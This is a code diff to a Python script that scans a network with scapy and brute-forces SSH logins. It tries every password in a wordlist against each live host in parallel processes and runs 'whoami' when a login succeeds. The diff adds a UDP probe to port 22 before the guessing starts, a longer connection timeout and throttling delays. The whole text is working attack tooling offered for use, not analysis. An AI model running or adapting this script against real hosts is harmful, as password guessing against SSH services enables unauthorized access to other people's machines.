@@ -1,10 +1,15 @@
 import os
 import scapy.all as scapy
+from scapy.all import IP, UDP
 import argparse
 from scapy.layers.l2 import ARP, Ether
 import paramiko
 import time
 import multiprocessing
+from multiprocessing import Lock
+
+from scapy.sendrecv import sr1
+
 
 
 def args():
@@ -30,7 +35,7 @@ def ssh_connect(ip_addr, passwd):
     ssh.load_system_host_keys()  # default .ssh/known_hosts ssh.load_host_keys("~/.ssh/known_hosts) - custom
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
     try:
-        ssh.connect(hostname=ip_addr, username=options.user, password=passwd, timeout=1)
+        ssh.connect(hostname=ip_addr, username=options.user, password=passwd, timeout=3)
         stdin, stdout, stderr = ssh.exec_command("whoami")
         # print(stdin)
         # print(stderr.read())
@@ -39,7 +44,8 @@ def ssh_connect(ip_addr, passwd):
               + "\033[0m{}".format(" PASSWORD ") + "\033[31m{}".format(password) + "\033[0m{}".format(" "))
         # print(stdout.read().decode("UTF-8"))
         ssh.close()
-        return
+        a = ip_addr
+        print(ip_addr)
     except:
         print("process id " + str(proc))
         print("no connection for " + ip_addr + " " + options.user + "/" + password)
@@ -58,12 +64,17 @@ if __name__ == "__main__":
     f = open(options.wordlist, "r")
     lines = f.read().splitlines()
     for i in devices:
-        for password in lines:
-            proc = multiprocessing.Process(target=ssh_connect, args=(i, password))
-            procs.append(proc)
-            proc.start()
-        for proc in procs:
-            proc.join()
+        packet = IP(dst=i)/UDP(dport=22, sport=22)
+        result = sr1(packet, timeout=5, verbose=0)
+        time.sleep(0.1)
+        if result is not None:
+            for password in lines:
+                proc = multiprocessing.Process(target=ssh_connect, args=(i, password))
+                procs.append(proc)
+                time.sleep(0.3)
+                proc.start()
+            for proc in procs:
+                proc.join()
     f.close()
     end = time.time()
     print(end - start)
